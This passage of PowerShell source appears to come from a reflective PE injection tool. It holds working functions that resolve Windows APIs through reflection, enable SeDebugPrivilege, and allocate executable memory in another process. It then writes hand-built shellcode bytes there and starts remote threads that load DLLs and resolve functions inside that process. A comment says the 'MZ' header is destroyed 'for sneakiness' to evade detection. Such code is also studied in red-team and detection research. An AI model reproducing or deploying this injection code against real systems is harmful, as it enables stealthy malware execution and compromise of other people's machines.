	        $Parameters = (New-Object Type[](0)),
	        
	        [Parameter( Position = 1 )]
	        [Type]
	        $ReturnType = [Void]
	    )

	    $Domain = [AppDomain]::CurrentDomain
	    $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
	    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
	    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
	    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
	    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
	    $MethodBuilder.SetImplementationFlags('Runtime, Managed')
	    
	    Write-Output $TypeBuilder.CreateType()
	}


	#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
	Function Get-ProcAddress
	{
	    Param
	    (
	        [OutputType([IntPtr])]
	    
	        [Parameter( Position = 0, Mandatory = $True )]
	        [String]
	        $Module,
	        
	        [Parameter( Position = 1, Mandatory = $True )]
	        [String]
	        $Procedure
	    )

	    # Get a reference to System.dll in the GAC
	    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
	        Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
	    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
	    # Get a reference to the GetModuleHandle and GetProcAddress methods
	    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
	    $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [reflection.bindingflags] "Public,Static", $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null);
	    # Get a handle to the module specified
	    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
	    $tmpPtr = New-Object IntPtr
	    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)

	    # Return the address of the function
	    Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
	}
	
	
	Function Enable-SeDebugPrivilege
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		
		[IntPtr]$ThreadHandle = $Win32Functions.GetCurrentThread.Invoke()
		if ($ThreadHandle -eq [IntPtr]::Zero)
		{
			Throw "Unable to get the handle to the current thread"
		}
		
		[IntPtr]$ThreadToken = [IntPtr]::Zero
		[Bool]$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
		if ($Result -eq $false)
		{
			$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($ErrorCode -eq $Win32Constants.ERROR_NO_TOKEN)
			{
				$Result = $Win32Functions.ImpersonateSelf.Invoke(3)
				if ($Result -eq $false)
				{
					Throw "Unable to impersonate self"
				}
				
				$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
				if ($Result -eq $false)
				{
					Throw "Unable to OpenThreadToken."
				}
			}
			else
			{
				Throw "Unable to OpenThreadToken. Error code: $ErrorCode"
			}
		}
		
		[IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.LUID))
		$Result = $Win32Functions.LookupPrivilegeValue.Invoke($null, "SeDebugPrivilege", $PLuid)
		if ($Result -eq $false)
		{
			Throw "Unable to call LookupPrivilegeValue"
		}

		[UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.TOKEN_PRIVILEGES)
		[IntPtr]$TokenPrivilegesMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)
		$TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesMem, [Type]$Win32Types.TOKEN_PRIVILEGES)
		$TokenPrivileges.PrivilegeCount = 1
		$TokenPrivileges.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, [Type]$Win32Types.LUID)
		$TokenPrivileges.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($TokenPrivileges, $TokenPrivilegesMem, $true)

		$Result = $Win32Functions.AdjustTokenPrivileges.Invoke($ThreadToken, $false, $TokenPrivilegesMem, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
		$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() #Need this to get success value or failure value
		if (($Result -eq $false) -or ($ErrorCode -ne 0))
		{
			#Throw "Unable to call AdjustTokenPrivileges. Return value: $Result, Errorcode: $ErrorCode"   #todo need to detect if already set
		}
		
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesMem)
	}
	
	
	Function Create-RemoteThread
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[IntPtr]
		$ProcessHandle,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,
		
		[Parameter(Position = 3, Mandatory = $false)]
		[IntPtr]
		$ArgumentPtr = [IntPtr]::Zero,
		
		[Parameter(Position = 4, Mandatory = $true)]
		[System.Object]
		$Win32Functions
		)
		
		[IntPtr]$RemoteThreadHandle = [IntPtr]::Zero
		
		$OSVersion = [Environment]::OSVersion.Version
		#Vista and Win7
		if (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (New-Object 'Version' 6,2)))
		{
			#Write-Verbose "Windows Vista/7 detected, using NtCreateThreadEx. Address of thread: $StartAddress"
			$RetVal= $Win32Functions.NtCreateThreadEx.Invoke([Ref]$RemoteThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $StartAddress, $ArgumentPtr, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
			$LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($RemoteThreadHandle -eq [IntPtr]::Zero)
			{
				Throw "Error in NtCreateThreadEx. Return value: $RetVal. LastError: $LastError"
			}
		}
		#XP/Win8
		else
		{
			#Write-Verbose "Windows XP/8 detected, using CreateRemoteThread. Address of thread: $StartAddress"
			$RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $ArgumentPtr, 0, [IntPtr]::Zero)
		}
		
		if ($RemoteThreadHandle -eq [IntPtr]::Zero)
		{
			Write-Error "Error creating remote thread, thread handle is null" -ErrorAction Stop
		}
		
		return $RemoteThreadHandle
	}

	

	Function Get-ImageNtHeaders
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		$NtHeadersInfo = New-Object System.Object
		
		#Normally would validate DOSHeader here, but we did it before this function was called and then destroyed 'MZ' for sneakiness
		$dosHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PEHandle, [Type]$Win32Types.IMAGE_DOS_HEADER)

		#Get IMAGE_NT_HEADERS
		[IntPtr]$NtHeadersPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEHandle) ([Int64][UInt64]$dosHeader.e_lfanew))
		$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $NtHeadersPtr
		$imageNtHeaders64 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS64)
		
		#Make sure the IMAGE_NT_HEADERS checks out. If it doesn't, the data structure is invalid. This should never happen.
	    if ($imageNtHeaders64.Signature -ne 0x00004550)
	    {
	        throw "Invalid IMAGE_NT_HEADER signature."
	    }
		
		if ($imageNtHeaders64.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC')
		{
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders64
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
		}
		else
		{
			$ImageNtHeaders32 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS32)
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders32
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
		}
		
		return $NtHeadersInfo
	}


	#This function will get the information needed to allocated space in memory for the PE
	Function Get-PEBasicInfo
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		$PEInfo = New-Object System.Object
		
		#Write the PE to memory temporarily so I can get information from it. This is not it's final resting spot.
		[IntPtr]$UnmanagedPEBytes = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PEBytes.Length)
		[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $UnmanagedPEBytes, $PEBytes.Length) | Out-Null
		
		#Get NtHeadersInfo
		$NtHeadersInfo = Get-ImageNtHeaders -PEHandle $UnmanagedPEBytes -Win32Types $Win32Types
		
		#Build a structure with the information which will be needed for allocating memory and writing the PE to memory
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value ($NtHeadersInfo.PE64Bit)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)
		
		#Free the memory allocated above, this isn't where we allocate the PE to memory
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($UnmanagedPEBytes)
		
		return $PEInfo
	}


	#PEInfo must contain the following NoteProperties:
	#	PEHandle: An IntPtr to the address the PE is loaded to in memory
	Function Get-PEDetailedInfo
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		
		if ($PEHandle -eq $null -or $PEHandle -eq [IntPtr]::Zero)
		{
			throw 'PEHandle is null or IntPtr.Zero'
		}
		
		$PEInfo = New-Object System.Object
		
		#Get NtHeaders information
		$NtHeadersInfo = Get-ImageNtHeaders -PEHandle $PEHandle -Win32Types $Win32Types
		
		#Build the PEInfo object
		$PEInfo | Add-Member -MemberType NoteProperty -Name PEHandle -Value $PEHandle
		$PEInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ($NtHeadersInfo.IMAGE_NT_HEADERS)
		$PEInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ($NtHeadersInfo.NtHeadersPtr)
		$PEInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value ($NtHeadersInfo.PE64Bit)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		
		if ($PEInfo.PE64Bit -eq $true)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS64)))
			$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
		}
		else
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS32)))
			$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
		}
		
		if (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)
		{
			$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'
		}
		elseif (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)
		{
			$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'EXE'
		}
		else
		{
			Throw "PE file is not an EXE or DLL"
		}
		
		return $PEInfo
	}
	
	
	Function Import-DllInRemoteProcess
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$RemoteProcHandle,
		
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		$ImportDllPathPtr
		)
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		
		$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
		$DllPathSize = [UIntPtr][UInt64]([UInt64]$ImportDllPath.Length + 1)
		$RImportDllPathPtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($RImportDllPathPtr -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process"
		}

		[UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RImportDllPathPtr, $ImportDllPathPtr, $DllPathSize, [Ref]$NumBytesWritten)
		
		if ($Success -eq $false)
		{
			Throw "Unable to write DLL path to remote process memory"
		}
		if ($DllPathSize -ne $NumBytesWritten)
		{
			Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		}
		
		$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
		$LoadLibraryAAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "LoadLibraryA") #Kernel32 loaded to the same address for all processes
		
		[IntPtr]$DllAddress = [IntPtr]::Zero
		#For 64bit DLL's, we can't use just CreateRemoteThread to call LoadLibrary because GetExitCodeThread will only give back a 32bit value, but we need a 64bit address
		#	Instead, write shellcode while calls LoadLibrary and writes the result to a memory address we specify. Then read from that memory once the thread finishes.
		if ($PEInfo.PE64Bit -eq $true)
		{
			#Allocate memory for the address returned by LoadLibraryA
			$LoadLibraryARetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			if ($LoadLibraryARetMem -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process for the return value of LoadLibraryA"
			}
			
			
			#Write Shellcode to the remote process which will call LoadLibraryA (Shellcode: LoadLibraryA.asm)
			$LoadLibrarySC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$LoadLibrarySC2 = @(0x48, 0xba)
			$LoadLibrarySC3 = @(0xff, 0xd2, 0x48, 0xba)
			$LoadLibrarySC4 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
			
			$SCLength = $LoadLibrarySC1.Length + $LoadLibrarySC2.Length + $LoadLibrarySC3.Length + $LoadLibrarySC4.Length + ($PtrSize * 3)
			$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
			$SCPSMemOriginal = $SCPSMem
			
			Write-BytesToMemory -Bytes $LoadLibrarySC1 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC1.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($RImportDllPathPtr, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC2 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC2.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryAAddr, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC3 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC3.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryARetMem, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC4 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC4.Length)

			
			$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if ($RSCAddr -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process for shellcode"
			}
			
			$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
			if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
			{
				Throw "Unable to write shellcode to remote process memory."
			}
			
			$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
			$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
			if ($Result -ne 0)
			{
				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			}
			
			#The shellcode writes the DLL address to memory in the remote process at address $LoadLibraryARetMem, read this memory
			[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
			$Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $LoadLibraryARetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
			if ($Result -eq $false)
			{
				Throw "Call to ReadProcessMemory failed"
			}
			[IntPtr]$DllAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

			$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $LoadLibraryARetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		}
		else
		{
			[IntPtr]$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $LoadLibraryAAddr -ArgumentPtr $RImportDllPathPtr -Win32Functions $Win32Functions
			$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
			if ($Result -ne 0)
			{
				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			}
			
			[Int32]$ExitCode = 0
			$Result = $Win32Functions.GetExitCodeThread.Invoke($RThreadHandle, [Ref]$ExitCode)
			if (($Result -eq 0) -or ($ExitCode -eq 0))
			{
				Throw "Call to GetExitCodeThread failed"
			}
			
			[IntPtr]$DllAddress = [IntPtr]$ExitCode
		}
		
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RImportDllPathPtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		
		return $DllAddress
	}
	
	
	Function Get-RemoteProcAddress
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$RemoteProcHandle,
		
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		$RemoteDllHandle,
		
		[Parameter(Position=2, Mandatory=$true)]
		[IntPtr]
		$FunctionNamePtr,#This can either be a ptr to a string which is the function name, or, if LoadByOrdinal is 'true' this is an ordinal number (points to nothing)

        [Parameter(Position=3, Mandatory=$true)]
        [Bool]
        $LoadByOrdinal
		)

		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])

		[IntPtr]$RFuncNamePtr = [IntPtr]::Zero   #Pointer to the function name in remote process memory if loading by function name, ordinal number if loading by ordinal
        #If not loading by ordinal, write the function name to the remote process memory
        if (-not $LoadByOrdinal)
        {
        	$FunctionName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($FunctionNamePtr)

		    #Write FunctionName to memory (will be used in GetProcAddress)
		    $FunctionNameSize = [UIntPtr][UInt64]([UInt64]$FunctionName.Length + 1)
		    $RFuncNamePtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $FunctionNameSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		    if ($RFuncNamePtr -eq [IntPtr]::Zero)
		    {
			    Throw "Unable to allocate memory in the remote process"
		    }

		    [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		    $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RFuncNamePtr, $FunctionNamePtr, $FunctionNameSize, [Ref]$NumBytesWritten)
		    if ($Success -eq $false)
		    {
			    Throw "Unable to write DLL path to remote process memory"
		    }
		    if ($FunctionNameSize -ne $NumBytesWritten)
		    {
			    Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		    }
        }
        #If loading by ordinal, just set RFuncNamePtr to be the ordinal number
        else
        {
            $RFuncNamePtr = $FunctionNamePtr
        }
		
		#Get address of GetProcAddress
		$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
		$GetProcAddressAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "GetProcAddress") #Kernel32 loaded to the same address for all processes

		
		#Allocate memory for the address returned by GetProcAddress
		$GetProcAddressRetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UInt64][UInt64]$PtrSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($GetProcAddressRetMem -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process for the return value of GetProcAddress"
		}
		
		
		#Write Shellcode to the remote process which will call GetProcAddress
		#Shellcode: GetProcAddress.asm
		[Byte[]]$GetProcAddressSC = @()
		if ($PEInfo.PE64Bit -eq $true)
		{
			$GetProcAddressSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$GetProcAddressSC2 = @(0x48, 0xba)
			$GetProcAddressSC3 = @(0x48, 0xb8)
			$GetProcAddressSC4 = @(0xff, 0xd0, 0x48, 0xb9)
			$GetProcAddressSC5 = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
		}
		else
		{
			$GetProcAddressSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
			$GetProcAddressSC2 = @(0xb9)
			$GetProcAddressSC3 = @(0x51, 0x50, 0xb8)
			$GetProcAddressSC4 = @(0xff, 0xd0, 0xb9)
			$GetProcAddressSC5 = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
		}
		$SCLength = $GetProcAddressSC1.Length + $GetProcAddressSC2.Length + $GetProcAddressSC3.Length + $GetProcAddressSC4.Length + $GetProcAddressSC5.Length + ($PtrSize * 4)
		$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
		$SCPSMemOriginal = $SCPSMem
		
		Write-BytesToMemory -Bytes $GetProcAddressSC1 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($RemoteDllHandle, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC2 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC2.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($RFuncNamePtr, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC3 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC3.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressAddr, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC4 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC4.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressRetMem, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC5 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC5.Length)
		
		$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
		if ($RSCAddr -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process for shellcode"
		}
		[UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
		if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
		{
			Throw "Unable to write shellcode to remote process memory."
		}
		
		$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
		$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
		if ($Result -ne 0)
		{
			Throw "Call to CreateRemoteThread to call GetProcAddress failed."
		}
		
		#The process address is written to memory in the remote process at address $GetProcAddressRetMem, read this memory
		[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
		$Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $GetProcAddressRetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
		if (($Result -eq $false) -or ($NumBytesWritten -eq 0))
		{
			Throw "Call to ReadProcessMemory failed"
		}
		[IntPtr]$ProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

        #Cleanup remote process memory
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $GetProcAddressRetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null

        if (-not $LoadByOrdinal)
        {
            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RFuncNamePtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        }
		
		return $ProcAddress
	}


	Function Copy-Sections
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
